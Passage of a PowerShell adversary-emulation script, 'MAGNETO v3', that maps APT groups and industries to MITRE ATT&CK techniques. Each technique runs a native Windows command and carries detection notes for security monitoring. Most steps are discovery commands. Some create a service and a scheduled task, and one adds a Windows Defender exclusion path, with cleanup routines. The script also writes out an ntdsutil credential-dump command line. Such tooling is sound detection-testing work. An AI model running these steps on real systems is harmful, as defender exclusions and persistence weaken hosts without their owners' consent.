<#
.SYNOPSIS
    MAGNETO v3 - Advanced APT Campaign & Attack Simulator
    Simulate real-world APT campaigns and MITRE ATT&CK techniques using native Windows LOLBins.
    Includes ALL original techniques plus APT campaign simulations.

.DESCRIPTION
    Enhanced PowerShell tool for simulating sophisticated APT campaigns on Windows systems.
    Includes pre-configured attack chains for major APT groups with their signature TTPs.
    All attacks use native Windows binaries for stealth and realism.
    
    UPDATED in v3:
    - Added 2 new sophisticated Exfiltration techniques (T1041 - HTTP POST, T1048.003 - DNS).
    - Fixed a bug that caused an incorrect "Successful" count in the execution summary.

.PARAMETER AttackMode
    Specifies the attack mode when not running a specific APT campaign.
    Options: Random, Chain

.PARAMETER APTCampaign
    Run a specific APT group's campaign simulation.
    Options: APT41, Lazarus, APT29, StealthFalcon, FIN7, APT28

.PARAMETER RandomSeed
    Optional seed for randomization (defaults to current day for daily variance).

.PARAMETER TechniqueCount
    Number of random techniques to execute in Random mode (default: 7).

.PARAMETER Cleanup
    Switch to clean up artifacts after simulation (recommended for demos).

.NOTES
    Author: Syed Hasan Rizvi
    Version: 3
    Date: October 2025
    MITRE Mapping: Complete with all original techniques plus APT enhancements
#>

param (
    [string]$APTCampaign,
    [ValidateSet('Random', 'Chain')]
    [string]$AttackMode,
    [int]$RandomSeed = (Get-Date).DayOfYear,
    [int]$TechniqueCount = 7,
    [switch]$Cleanup,
    [string[]]$ExcludeTactics = @(),
    [string[]]$IncludeTactics = @(),
    [string[]]$ExcludeTechniques = @(),
    [string[]]$IncludeTechniques = @(),
    [switch]$RunAll,
    [switch]$RunAllForTactics,
    [int]$DelayBetweenTechniques = 2,
    [switch]$CheckForUpdates,
    [switch]$ListTechniques,
    [switch]$ListTactics,
    [switch]$ListAPTCampaigns,
    [switch]$Help,
    [switch]$WhatIf,

    # Industry Vertical Parameters
    [string]$IndustryVertical,
    [switch]$ListIndustryVerticals,

    # Remote Execution Parameters
    [string]$RemoteComputer,
    [System.Management.Automation.PSCredential]$RemoteCredential
)

# Script Version Info
$scriptVersion = "3.3.1"
$scriptDate = "October 2025"
$attackFrameworkVersion = "16.1"  # MITRE ATT&CK version compatibility
$techniqueSchemaVersion = "3.0"   # Internal technique definition schema version

# APT Campaign Definitions
$aptCampaigns = @{
    "APT41" = @{
        Name = "Shadow Harvest Campaign"
        Description = "Chinese state-sponsored group focusing on espionage and financial gain"
        Techniques = @("T1049", "T1087.001", "T1218.011", "T1546.015", "T1055.100", "T1550.002", "T1021.002", "T1041")
        TimingProfile = "Methodical"
        C2Style = "SharePoint/O365"
    }
    "Lazarus" = @{
        Name = "DEV#POPPER Campaign"
        Description = "North Korean group targeting financial and critical infrastructure"
        Techniques = @("T1574.002", "T1053.005", "T1003.003", "T1021.002", "T1560.002")
        TimingProfile = "Methodical"
        C2Style = "Dropbox"
    }
    "APT29" = @{
        Name = "GRAPELOADER Campaign"
        Description = "Russian SVR group focusing on government and diplomatic targets"
        Techniques = @("T1546.015", "T1053.005", "T1134.001", "T1070.004")
        TimingProfile = "Patient"
        C2Style = "OneDrive"
    }
    "StealthFalcon" = @{
        Name = "Project Raven"
        Description = "Middle East dissident targeting"
        Techniques = @("T1548.002", "T1027", "T1112")
        TimingProfile = "Targeted"
        C2Style = "CustomHTTPS"
    }
    "FIN7" = @{
        Name = "Carbanak Campaign"
        Description = "Financially motivated group targeting retail and hospitality"
        Techniques = @("T1059.001", "T1105", "T1543.003")
        TimingProfile = "Aggressive"
        C2Style = "DNS"
    }
    "APT28" = @{
        Name = "Fancy Bear Operations"
        Description = "Russian GRU group targeting government and military"
        Techniques = @("T1059.001", "T1548.002", "T1021.002")
        TimingProfile = "Persistent"
        C2Style = "HTTPS"
    }
}

# Industry Vertical Definitions (Embedded)
$industryVerticals = @{
    "Financial Services" = @{
        DisplayName = "Financial Services & Banking"
        Description = "Banks, financial institutions, cryptocurrency exchanges, payment processors, FinTech"
        RiskProfile = "Critical"
        PrimaryThreats = @("Financial theft", "Ransomware", "Data breach for fraud", "Wire transfer fraud", "Cryptocurrency theft")
        APTGroups = @("Lazarus", "FIN7", "APT38", "Carbanak")
        Techniques = @("T1087.001", "T1003.003", "T1550.002", "T1021.002", "T1560.002", "T1041", "T1048.003", "T1486", "T1490", "T1489")
        TopTactics = @("Credential Access", "Lateral Movement", "Exfiltration", "Impact")
    }
    "Healthcare" = @{
        DisplayName = "Healthcare & Hospitals"
        Description = "Hospitals, healthcare providers, medical equipment manufacturers, pharmaceutical companies"
        RiskProfile = "Critical"
        PrimaryThreats = @("Ransomware", "Patient data theft", "Medical device compromise", "Research IP theft", "Service disruption")
        APTGroups = @("APT41", "FIN7", "LockBit", "ALPHV/BlackCat", "Royal", "BlackBasta", "Cl0p")
        Techniques = @("T1566.001", "T1078", "T1021.001", "T1486", "T1490", "T1489", "T1048.003", "T1005", "T1560.001")
        TopTactics = @("Initial Access", "Persistence", "Impact", "Exfiltration")
    }
    "Energy & Utilities" = @{
        DisplayName = "Energy, Oil & Gas, Utilities"
        Description = "Power generation, oil/gas, water treatment, electric utilities, renewable energy"
        RiskProfile = "Critical Infrastructure"
        PrimaryThreats = @("ICS/SCADA compromise", "Physical infrastructure damage", "Service disruption", "Espionage", "Supply chain attacks")
        APTGroups = @("APT33", "APT28", "APT29", "Dragonfly", "Chernovite", "Voltzite")
        Techniques = @("T1190", "T1133", "T1078", "T1082", "T1018", "T1046", "T1021.002", "T1490", "T1489", "T1529")
        TopTactics = @("Initial Access", "Discovery", "Lateral Movement", "Impact")
    }
    "Manufacturing & OT" = @{
        DisplayName = "Manufacturing & Industrial (OT/ICS)"
        Description = "Industrial control systems, manufacturing plants, supply chain, smart factories"
        RiskProfile = "Critical"
        PrimaryThreats = @("Production disruption", "ICS/PLC compromise", "IP/trade secret theft", "Supply chain attacks", "Sabotage")
        APTGroups = @("APT41", "APT28", "Chernovite", "Gananite", "Bentonite")
        Techniques = @("T1190", "T1078", "T1082", "T1083", "T1021.002", "T1005", "T1074.001", "T1041", "T1486", "T1489")
        TopTactics = @("Collection", "Exfiltration", "Impact", "Lateral Movement")
    }
    "Technology" = @{
        DisplayName = "Technology & Software"
        Description = "Software companies, cloud providers, SaaS, IT services, telecommunications"
        RiskProfile = "High"
        PrimaryThreats = @("Supply chain compromise", "Source code theft", "Customer data breach", "Cloud infrastructure attacks", "Intellectual property theft")
        APTGroups = @("APT29", "APT41", "APT28")
        Techniques = @("T1195.002", "T1199", "T1078.004", "T1552.001", "T1552.004", "T1087.004", "T1069.003", "T1530", "T1537", "T1567.002")
        TopTactics = @("Initial Access", "Credential Access", "Collection", "Exfiltration")
    }
    "Government" = @{
        DisplayName = "Government & Defense"
        Description = "Federal/state/local government, defense contractors, military, intelligence"
        RiskProfile = "Critical"
        PrimaryThreats = @("Nation-state espionage", "Classified data theft", "Political manipulation", "Critical infrastructure targeting", "APT campaigns")
        APTGroups = @("APT29", "APT28", "APT41", "Lazarus")
        Techniques = @("T1566.001", "T1566.002", "T1195.002", "T1078", "T1003.003", "T1087.002", "T1069.002", "T1021.002", "T1041", "T1020")
        TopTactics = @("Initial Access", "Credential Access", "Lateral Movement", "Exfiltration")
    }
    "Education & Research" = @{
        DisplayName = "Education & Academia"
        Description = "Universities, K-12 schools, research institutions, educational technology"
        RiskProfile = "Medium-High"
        PrimaryThreats = @("Research IP theft", "Student data breach", "Ransomware", "Credential harvesting", "Grant/research fraud")
        APTGroups = @("APT41", "APT29")
        Techniques = @("T1566.001", "T1078", "T1110.003", "T1087.001", "T1083", "T1005", "T1114.002", "T1486", "T1567.002")
        TopTactics = @("Initial Access", "Credential Access", "Collection", "Impact")
    }
    "Retail & Hospitality" = @{
        DisplayName = "Retail, Hospitality & E-Commerce"
        Description = "Retail stores, restaurants, hotels, e-commerce platforms, point-of-sale systems"
        RiskProfile = "High"
        PrimaryThreats = @("Payment card theft", "POS malware", "Customer data breach", "E-commerce fraud", "Ransomware")
        APTGroups = @("FIN7", "Carbanak")
        Techniques = @("T1566.001", "T1078", "T1003.001", "T1552.001", "T1005", "T1056.001", "T1113", "T1041", "T1486")
        TopTactics = @("Credential Access", "Collection", "Exfiltration", "Impact")
    }
    "Telecommunications" = @{
        DisplayName = "Telecommunications & ISPs"
        Description = "Telecom providers, ISPs, mobile carriers, network infrastructure, 5G"
        RiskProfile = "Critical Infrastructure"
        PrimaryThreats = @("Network infrastructure attacks", "Customer data theft", "Service disruption", "Supply chain compromise", "Espionage")
        APTGroups = @("APT28", "APT29", "APT41")
        Techniques = @("T1190", "T1133", "T1078", "T1018", "T1046", "T1021.002", "T1005", "T1114.002", "T1020", "T1489")
        TopTactics = @("Initial Access", "Discovery", "Collection", "Impact")
    }
    "Transportation" = @{
        DisplayName = "Transportation & Logistics"
        Description = "Airlines, shipping, rail, logistics, supply chain management"
        RiskProfile = "Critical Infrastructure"
        PrimaryThreats = @("Operational disruption", "Supply chain attacks", "Customer data theft", "Ransomware", "Safety system compromise")
        APTGroups = @("APT41", "APT28")
        Techniques = @("T1190", "T1078", "T1082", "T1083", "T1021.002", "T1005", "T1486", "T1489", "T1490")
        TopTactics = @("Initial Access", "Persistence", "Impact", "Collection")
    }
}

# Check for help or list commands
if ($Help) {
    Write-Host @"

MAGNETO v3 - Advanced APT Campaign & Attack Simulator
========================================================
Simulate real-world APT campaigns and MITRE ATT&CK techniques.

USAGE:
    .\MAGNETO_v3.ps1 -APTCampaign <APTGroup> [parameters]
    .\MAGNETO_v3.ps1 -AttackMode <Random|Chain> [parameters]

APT CAMPAIGNS:
    -APTCampaign <string>
        Run specific APT group campaign: APT41, Lazarus, APT29, StealthFalcon, FIN7, APT28

    -ListAPTCampaigns
        Display all available APT campaigns with details

INDUSTRY VERTICALS (NEW):
    -IndustryVertical <string>
        Target specific industry sector: Financial Services, Healthcare, Energy & Utilities,
        Manufacturing & OT, Technology, Government, Education & Research, Retail & Hospitality,
        Telecommunications, Transportation

    -ListIndustryVerticals
        Display all available industry verticals with threat profiles

STANDARD PARAMETERS:
    -AttackMode <string>       'Random' or 'Chain' mode. Defaults to 'Random'.
    -TechniqueCount <int>      Number of random techniques (default: 7)
    -Cleanup                   Clean up artifacts after simulation
    -WhatIf                    Preview techniques without executing (dry-run mode)
    -DelayBetweenTechniques    Delay in seconds between techniques
    -IncludeTechniques @()     Include specific technique IDs
    -ExcludeTechniques @()     Exclude specific technique IDs
    -IncludeTactics @()        Include specific tactics
    -ExcludeTactics @()        Exclude specific tactics
    -RunAll                    Run all available techniques
    -ListTechniques           List all available techniques
    -ListTactics              List all available tactics

"@ -ForegroundColor Cyan
    exit 0
}

if ($ListAPTCampaigns) {
    Write-Host "`nAvailable APT Campaign Simulations:" -ForegroundColor Cyan
    Write-Host "=" * 60 -ForegroundColor DarkGray
    
    foreach ($apt in $aptCampaigns.Keys | Sort-Object) {
        $campaign = $aptCampaigns[$apt]
        Write-Host "`n[$apt] - $($campaign.Name)" -ForegroundColor Yellow
        Write-Host "  Description: $($campaign.Description)" -ForegroundColor Gray
        Write-Host "  Timing: $($campaign.TimingProfile)" -ForegroundColor Gray
        Write-Host "  C2 Style: $($campaign.C2Style)" -ForegroundColor Gray
    }
    
    Write-Host "`nUsage: .\MAGNETO_v3.ps1 -APTCampaign <APTGroup> -Cleanup" -ForegroundColor Green
    exit 0
}

# List Industry Verticals
if ($ListIndustryVerticals) {
    Write-Host "`nAvailable Industry Verticals for Targeted Demonstrations:" -ForegroundColor Cyan
    Write-Host "=" * 80 -ForegroundColor DarkGray

    foreach ($verticalName in ($industryVerticals.Keys | Sort-Object)) {
        $vertical = $industryVerticals[$verticalName]

        Write-Host "`n[$verticalName]" -ForegroundColor Yellow
        Write-Host "  Display Name: $($vertical.DisplayName)" -ForegroundColor White
        Write-Host "  Description: $($vertical.Description)" -ForegroundColor Gray
        Write-Host "  Risk Profile: $($vertical.RiskProfile)" -ForegroundColor $(
            switch ($vertical.RiskProfile) {
                "Critical" { "Red" }
                "Critical Infrastructure" { "Red" }
                "High" { "Yellow" }
                default { "White" }
            }
        )
        Write-Host "  Techniques: $($vertical.Techniques.Count)" -ForegroundColor Cyan
        Write-Host "  Threat Groups: $($vertical.APTGroups -join ', ')" -ForegroundColor Magenta
    }

    Write-Host "`n" -NoNewline
    Write-Host "=" * 80 -ForegroundColor DarkGray
    Write-Host "`nUsage: .\MAGNETO_v3.ps1 -IndustryVertical 'Financial Services'" -ForegroundColor Green
    Write-Host "       .\MAGNETO_v3.ps1 -IndustryVertical 'Healthcare' -Cleanup" -ForegroundColor Green
    Write-Host ""
    exit 0
}

# Seed random for reproducibility
$random = New-Object System.Random($RandomSeed)

# Initialize tracking arrays
$global:logCommands = @()
$global:cleanupReport = New-Object System.Collections.ArrayList
$global:executionResults = New-Object System.Collections.ArrayList
$global:actuallyExecutedTechniqueIDs = New-Object System.Collections.ArrayList

# Helper Functions
function Log-AttackStep {
    param ([string]$Message, [string]$MITREID)
    Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [$MITREID] $Message" -ForegroundColor Yellow
    $global:logCommands += "[$(Get-Date -Format 'HH:mm:ss')] [$MITREID] $Message"
    Start-Sleep -Milliseconds (500 + $random.Next(1500))
}

function Show-BlinkEffect {
    param ([string]$Message = "EXECUTED.")
    for ($i = 0; $i -lt 3; $i++) {
        Write-Host $Message -ForegroundColor Red -NoNewline
        Start-Sleep -Milliseconds 200
        Write-Host "`r$(' ' * $Message.Length)`r" -NoNewline
        Start-Sleep -Milliseconds 200
    }
    Write-Host $Message -ForegroundColor Red
    Start-Sleep -Seconds (1 + $random.Next(2))
}

function Generate-RandomUser {
    $adjectives = @("Shadow", "Ghost", "Phantom", "Rogue", "Ninja", "Cipher", "Viper", "Hawk", "Raven", "Wolf")
    $nouns = @("Hacker", "Intruder", "Agent", "Spy", "Operative", "Ghost", "Phantom", "Shadow", "Rogue", "Ninja")
    $user = "$($adjectives[$random.Next($adjectives.Count)])_$($nouns[$random.Next($nouns.Count)])_$($random.Next(1000))"
    return $user
}

function Generate-RandomIP {
    $ip = "$($random.Next(1,256)).$($random.Next(256)).$($random.Next(256)).$($random.Next(256))"
    return $ip
}

function Test-DomainJoined {
    return ($env:USERDOMAIN -ne $env:COMPUTERNAME)
}

function Test-AdminPrivileges {
    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Test-ServiceExists {
    param([string]$ServiceName)
    return (Get-Service -Name $ServiceName -ErrorAction SilentlyContinue) -ne $null
}

function Test-TechniqueCompatibility {
    param(
        [hashtable]$Technique,
        [string]$RequiredFrameworkVersion = $attackFrameworkVersion
    )

    # Check if technique has version info
    if ($Technique.ContainsKey('AttackVersion')) {
        $techVersion = [version]$Technique.AttackVersion
        $requiredVersion = [version]$RequiredFrameworkVersion

        if ($techVersion -gt $requiredVersion) {
            Write-Warning "Technique $($Technique.ID) requires ATT&CK v$($Technique.AttackVersion), current framework is v$RequiredFrameworkVersion"
            return $false
        }
    }

    # Check for deprecated techniques
    if ($Technique.ContainsKey('Deprecated') -and $Technique.Deprecated -eq $true) {
        Write-Warning "Technique $($Technique.ID) is deprecated in ATT&CK framework"
        return $false
    }

    return $true
}

# Ensure Temp directory exists
if (!(Test-Path "C:\Temp")) { New-Item -Path "C:\Temp" -ItemType Directory -Force | Out-Null }

# COMPLETE Techniques Array - ALL Original Techniques + New APT Techniques
$techniques = @(
    # === ALL ORIGINAL TECHNIQUES FROM MAGNETO.ps1 ===
    @{
        ID = 'T1046'
        Name = 'Network Service Discovery'
        Tactic = 'Discovery'
        ValidationRequired = $null
        Action = { try { netstat -ano | Out-Null; Log-AttackStep "Command: netstat -ano" "T1046"; $null = $global:executionResults.Add(@{ID="T1046"; Success=$true}) } catch { $null = $global:executionResults.Add(@{ID="T1046"; Success=$false; Error=$_.Exception.Message}) } }
        CleanupAction = $null
        Description = @{
            WhyTrack = "Network service scanning is a key reconnaissance indicator that precedes exploitation. UEBA can detect port scanning tools (nmap, masscan) and built-in utilities (netstat) used for service enumeration. Monitor for rapid sequential connection attempts to multiple ports, especially from non-admin users or workstations. Scanning activity often targets common ports (445/SMB, 3389/RDP, 22/SSH, 80/443/HTTP(S)) to identify attack surfaces before exploitation."
            RealWorldUsage = "APT41 (Double Dragon dual espionage/cybercrime), Iranian Chafer APT (Kuwait/Saudi aviation and government), Naikon APT (MsnMM campaigns), and Lebanese Cedar APT (global espionage via compromised web servers). Attackers use netstat and port scanners to map network topology, identify vulnerable services, and plan lateral movement paths. This reconnaissance phase is critical for targeting high-value assets and understanding network segmentation before launching attacks."
        }
    },
    @{
        ID = 'T1087.001'
        Name = 'Account Discovery: Local Account'
        Tactic = 'Discovery'
        ValidationRequired = $null
        Action = { try { net user | Out-Null; Log-AttackStep "Command: net user" "T1087.001"; $null = $global:executionResults.Add(@{ID="T1087.001"; Success=$true}) } catch { $null = $global:executionResults.Add(@{ID="T1087.001"; Success=$false; Error=$_.Exception.Message}) } }
        CleanupAction = $null
        Description = @{
            WhyTrack = "Enumerating local accounts is a critical early indicator of adversary reconnaissance. UEBA systems can detect unusual account enumeration patterns that deviate from normal user behavior, especially when performed by non-administrative users or from unusual workstations. This technique often precedes privilege escalation attempts, making early detection crucial for preventing further compromise."
            RealWorldUsage = "Extensively used by INDRIK SPIDER's BitPaymer ransomware during 'Big Game Hunting' operations, DarkSide ransomware (Colonial Pipeline attack), APT42 (Iranian targeting), APT1 (Chinese espionage), Hidden Cobra (North Korean), and MosesStaff. Ransomware operators use this to identify high-value admin accounts before deploying encryption payloads. ESXi ransomware actors specifically use 'esxcli system account list' to enumerate VMware environments."
        }
    },
    @{
        ID = 'T1059.001'
        Name = 'Command and Scripting Interpreter: PowerShell'
        Tactic = 'Execution'
        ValidationRequired = $null
        Action = { try { powershell.exe -Command "Get-Process" | Out-Null; Log-AttackStep "Command: powershell.exe -Command Get-Process" "T1059.001"; $null = $global:executionResults.Add(@{ID="T1059.001"; Success=$true}) } catch { $null = $global:executionResults.Add(@{ID="T1059.001"; Success=$false; Error=$_.Exception.Message}) } }
        CleanupAction = $null
        Description = @{
            WhyTrack = "PowerShell execution monitoring is essential because fileless attacks leave minimal forensic footprints. UEBA can detect anomalous PowerShell usage including encoded commands, unusual parent processes, network connections, or execution from unexpected user accounts. Baseline PowerShell activity patterns make deviations highly suspicious, especially when combined with obfuscation techniques."
            RealWorldUsage = "APT29 (Cozy Bear/SVR) extensively uses PowerShell in fileless attacks, including the POSHSPY backdoor and the SolarWinds supply chain compromise. APT29 deploys WMI persistence with PowerShell scripts that decrypt payloads directly in memory. Used in the 2016 DNC breach and 2020 Microsoft Exchange attacks. PowerShell Empire and Cobalt Strike frameworks leverage this for post-exploitation, making it a staple of both nation-state APTs and ransomware operations."
        }
    },
    @{
        ID = 'T1543.003'
        Name = 'Create or Modify System Process: Windows Service'
        Tactic = 'Persistence'
        ValidationRequired = { Test-AdminPrivileges }
        Action = { 
            $svcName = "StealthSvc_$($random.Next(1000))"
            $script:svcName = $svcName
            try { 
                sc.exe create $svcName binPath= "cmd.exe /c echo Simulated Service" | Out-Null
                Log-AttackStep "Command: sc.exe create $svcName binPath= cmd.exe /c echo Simulated Service" "T1543.003"
                $null = $global:executionResults.Add(@{ID="T1543.003"; Success=$true; ServiceName=$svcName})
            } catch { 
                $null = $global:executionResults.Add(@{ID="T1543.003"; Success=$false; Error=$_.Exception.Message})
            }
        }
        CleanupAction = { 
            if ($script:svcName) {
                try { 
                    sc.exe delete $script:svcName | Out-Null
                    $null = $global:cleanupReport.Add(@{ID="T1543.003"; Status="Success"; Details="Removed service $script:svcName"})
                } catch { 
                    $null = $global:cleanupReport.Add(@{ID="T1543.003"; Status="Failed"; Error=$_.Exception.Message})
                }
            }
        }
        Description = @{
            WhyTrack = "Malicious service creation is a high-confidence persistence indicator. UEBA can detect unusual service installations by monitoring Event IDs 4697 and 7045, especially services with suspicious names, unusual binary paths, or created outside maintenance windows. Services configured to run as SYSTEM with network capabilities are particularly suspicious. Cobalt Strike's default service naming (7 random alphanumeric characters) creates a detectable pattern."
            RealWorldUsage = "Used by Operation Cobalt Kitty (Asia), APT41 (Chinese espionage/cybercrime), CARBANAK (bank heists), GREYENERGY (BlackEnergy successor), Iron Tiger, Turla, Winnti, and OceanLotus. Cobalt Strike beacons create services during privilege escalation and lateral movement, with services named like '1a2b3c4.exe' stored in ADMIN$ shares. DoppelPaymer and AvosLocker ransomware install services before encryption to ensure persistence."
        }
    },
    @{
        ID = 'T1562.001'
        Name = 'Impair Defenses: Modify Defender Exclusion'
        Tactic = 'Defense Evasion'
        ValidationRequired = { Test-AdminPrivileges }
        Action = { 
            $exclPath = "C:\Temp\sim_excl_$($random.Next(1000))"
            $script:exclPath = $exclPath
            try { 
                New-Item -Path $exclPath -ItemType Directory -Force | Out-Null
                Set-MpPreference -ExclusionPath $exclPath -ErrorAction SilentlyContinue | Out-Null
                Log-AttackStep "Command: Set-MpPreference -ExclusionPath $exclPath" "T1562.001"
                $null = $global:executionResults.Add(@{ID="T1562.001"; Success=$true; ExclusionPath=$exclPath})
            } catch { 
                $null = $global:executionResults.Add(@{ID="T1562.001"; Success=$false; Error=$_.Exception.Message})
            }
        }
        CleanupAction = { 
            if ($script:exclPath) {
                try { 
                    Remove-MpPreference -ExclusionPath $script:exclPath -ErrorAction SilentlyContinue | Out-Null
                    Remove-Item $script:exclPath -Force -ErrorAction SilentlyContinue | Out-Null
                    $null = $global:cleanupReport.Add(@{ID="T1562.001"; Status="Success"; Details="Removed exclusion $script:exclPath"})
                } catch { 
                    $null = $global:cleanupReport.Add(@{ID="T1562.001"; Status="Failed"; Error=$_.Exception.Message})
                }
            }
        }
        Description = @{
            WhyTrack = "Modifying Defender exclusions creates anomalous config changes that UEBA can detect. Monitor PowerShell cmdlets Set-MpPreference and Add-MpPreference, especially when adding exclusion paths or disabling real-time protection. BYOVD (Bring Your Own Vulnerable Driver) attacks disable EDR at kernel level. This technique was the most prevalent in malware campaigns in 2025, making it essential for detection and response."
            RealWorldUsage = "APT35 (Iranian ProxyShell attacks), Naikon APT (MsnMM campaigns), Kimsuky (North Korean), PLATINUM APT (Southeast Asia), Solorigate/SUNBURST (SolarWinds 2020), PROMETHIUM APT, and Iranian attacks on Albanian government (2024). Kasseika ransomware uses BYOVD to disable AV. AvosLocker and DoppelPaymer ransomware disable Defender before encryption. BlackByte, Conti, LockBit, and REvil ransomware routinely use Set-MpPreference to add exclusion paths for their malware directories."
        }
    },
    @{
        ID = 'T1070.004'
        Name = 'Indicator Removal: File Deletion'
        Tactic = 'Defense Evasion'
        ValidationRequired = $null
        Action = { 
            $tempFile = "C:\Temp\sim_$($random.Next(1000)).txt"
            try { 
                New-Item $tempFile -ItemType File -Force | Out-Null
                Remove-Item $tempFile -Force | Out-Null
                Log-AttackStep "Command: New-Item $tempFile; Remove-Item $tempFile" "T1070.004"
                $null = $global:executionResults.Add(@{ID="T1070.004"; Success=$true})
            } catch { 
                $null = $global:executionResults.Add(@{ID="T1070.004"; Success=$false; Error=$_.Exception.Message})
            }
        }
        CleanupAction = $null
        Description = @{
            WhyTrack = "Anti-forensics file deletion removes evidence of malicious activity. UEBA detects rapid file creation/deletion patterns in temp directories, suspicious use of cipher.exe or sdelete for secure deletion, and deletion of log files, browser history, or recent documents. Monitor for timestomp utilities modifying file MAC times. File deletion combined with event log clearing indicates comprehensive anti-forensics efforts."
            RealWorldUsage = "APT29, Lazarus, and FIN7 delete tools, payloads, and logs after execution to impede forensic analysis. Ransomware operators delete shadow copies and backups using 'vssadmin delete shadows' before encryption. Sophisticated actors use secure deletion tools (sdelete, cipher /w) to prevent file recovery. Common targets: prefetch files, AmCache, browser history, Windows Event Logs, and staged payloads in temp directories."
        }
    },
    @{
        ID = 'T1003.003'
        Name = 'OS Credential Dumping: NTDS'
        Tactic = 'Credential Access'
        ValidationRequired = { Test-DomainJoined -and Test-AdminPrivileges }
        Action = { 
            try { 
                if (Get-Command ntdsutil.exe -ErrorAction SilentlyContinue) {
                    Log-AttackStep "Command: ntdsutil.exe ac i ntds ifm create full c:\temp q q (simulated)" "T1003.003"
                    $null = $global:executionResults.Add(@{ID="T1003.003"; Success=$true; Method="ntdsutil"})
                } else {
                    Get-ChildItem "C:\Windows\NTDS" -ErrorAction SilentlyContinue | Out-Null
                    Log-AttackStep "Command: Get-ChildItem C:\Windows\NTDS" "T1003.003"
                    $null = $global:executionResults.Add(@{ID="T1003.003"; Success=$true; Method="directory_enum"})
                }
            } catch { 
                $null = $global:executionResults.Add(@{ID="T1003.003"; Success=$false; Error=$_.Exception.Message})
            }
        }
        CleanupAction = $null
        Description = @{
            WhyTrack = "NTDS.dit access is one of the highest-severity alerts because it contains password hashes for every domain user, including Domain Admins. UEBA should monitor for ntdsutil.exe execution, volume shadow copy creation on domain controllers, and Event IDs 325/327 (ESENT database events). Detecting this early prevents domain-wide compromise. Once attackers obtain NTDS.dit, they can perform pass-the-hash attacks or offline cracking to compromise the entire Active Directory forest."
            RealWorldUsage = "APT28/Fancy Bear (GRU) uses DCSync attacks to remotely harvest NTDS credentials by impersonating domain controllers. Volt Typhoon (Chinese) uses 'ntdsutil.exe ac i ntds ifm create full' to replicate NTDS.dit. Rhysida ransomware group (CISA AA23-319A) extracts NTDS.dit for credential theft before encryption. APT groups exploit Volume Shadow Copy Service to steal NTDS.dit and SYSTEM registry hive from live domain controllers. This technique enables attackers to compromise every account in the domain, making it a critical kill-chain step."
        }
    },
    @{
        ID = 'T1049'
        Name = 'System Network Connections Discovery'
        Tactic = 'Discovery'
        ValidationRequired = $null
        Action = { try { ipconfig /displaydns | Out-Null; Log-AttackStep "Command: ipconfig /displaydns" "T1049"; $null = $global:executionResults.Add(@{ID="T1049"; Success=$true}) } catch { $null = $global:executionResults.Add(@{ID="T1049"; Success=$false; Error=$_.Exception.Message}) } }
        CleanupAction = $null
        Description = @{
            WhyTrack = "DNS cache enumeration reveals internal hostnames and recently accessed domains, providing attackers with network intelligence. UEBA can detect unusual ipconfig/displaydns executions, especially by non-admin users or from unexpected processes. This technique maps internal infrastructure and identifies targets for lateral movement without generating network traffic that would trigger IDS."
            RealWorldUsage = "Used by APT groups during reconnaissance to identify domain controllers, file servers, and high-value targets. Reveals cached DNS entries showing recent connections to internal servers, external C2 domains, and cloud services. Combined with other discovery techniques to build comprehensive network maps. Particularly valuable in segmented networks where direct scanning would be detected."
        }
    },
    @{
        ID = 'T1016'
        Name = 'System Network Configuration Discovery'
        Tactic = 'Discovery'
        ValidationRequired = $null
        Action = { try { route print | Out-Null; Log-AttackStep "Command: route print" "T1016"; $null = $global:executionResults.Add(@{ID="T1016"; Success=$true}) } catch { $null = $global:executionResults.Add(@{ID="T1016"; Success=$false; Error=$_.Exception.Message}) } }
        CleanupAction = $null
        Description = @{
            WhyTrack = "Routing table enumeration reveals network architecture, VPN configurations, and subnet relationships critical for planning lateral movement. UEBA detects unusual 'route print', 'netstat -r', or 'arp -a' executions. This passive reconnaissance doesn't generate network alerts, making endpoint detection crucial. Monitor for enumeration combined with other discovery techniques indicating attack progression."
            RealWorldUsage = "Standard reconnaissance by APT groups and ransomware operators to understand network segmentation, identify DMZ subnets, locate domain controllers, and plan lateral movement paths. Used to identify network boundaries, dual-homed hosts for pivoting, and routes to high-value subnets. Particularly critical in complex enterprise networks with multiple VLANs and security zones."
        }
    },
    @{
        ID = 'T1033'
        Name = 'System Owner/User Discovery'
        Tactic = 'Discovery'
        ValidationRequired = $null
        Action = { try { whoami /all | Out-Null; Log-AttackStep "Command: whoami /all" "T1033"; $null = $global:executionResults.Add(@{ID="T1033"; Success=$true}) } catch { $null = $global:executionResults.Add(@{ID="T1033"; Success=$false; Error=$_.Exception.Message}) } }
        CleanupAction = $null
        Description = @{
            WhyTrack = "User enumeration with 'whoami /all' reveals group memberships, privileges, and security context essential for privilege escalation planning. UEBA detects unusual whoami executions showing attackers assessing their current access level. Monitor for whoami combined with queries for admin groups (Domain Admins, Enterprise Admins) indicating privilege escalation reconnaissance. Particularly suspicious when executed by service accounts or from unusual parent processes."
            RealWorldUsage = "Universal first step for APT groups and ransomware after initial compromise to assess privilege level and determine if escalation is needed. Conti, LockBit, and REvil ransomware use this to identify if they have sufficient privileges for deployment. APT groups check for admin/domain privileges before attempting credential dumping or lateral movement. Outputs reveal if user is in sensitive groups, enabling attackers to tailor their escalation strategy."
        }
    },
    @{
        ID = 'T1053.005'
        Name = 'Scheduled Task/Job: Scheduled Task'
        Tactic = 'Persistence'
        ValidationRequired = { Test-AdminPrivileges }
        Action = { 
            $taskName = "ShadowTask_$($random.Next(1000))"
            $script:taskName = $taskName
            $futureTime = (Get-Date).AddMinutes(5).ToString("HH:mm")
            try { 
                schtasks /create /tn $taskName /tr "cmd.exe /c echo Simulated Task" /sc once /st $futureTime /f | Out-Null
                Log-AttackStep "Command: schtasks /create /tn $taskName /tr cmd.exe /c echo Simulated Task /sc once /st $futureTime" "T1053.005"
                $null = $global:executionResults.Add(@{ID="T1053.005"; Success=$true; TaskName=$taskName})
            } catch { 
                $null = $global:executionResults.Add(@{ID="T1053.005"; Success=$false; Error=$_.Exception.Message})
            }
        }
        CleanupAction = { 
            if ($script:taskName) {
                try { 
                    schtasks /delete /tn $script:taskName /f | Out-Null
                    $null = $global:cleanupReport.Add(@{ID="T1053.005"; Status="Success"; Details="Removed task $script:taskName"})
                } catch { 
                    $null = $global:cleanupReport.Add(@{ID="T1053.005"; Status="Failed"; Error=$_.Exception.Message})
                }
            }
        }
        Description = @{
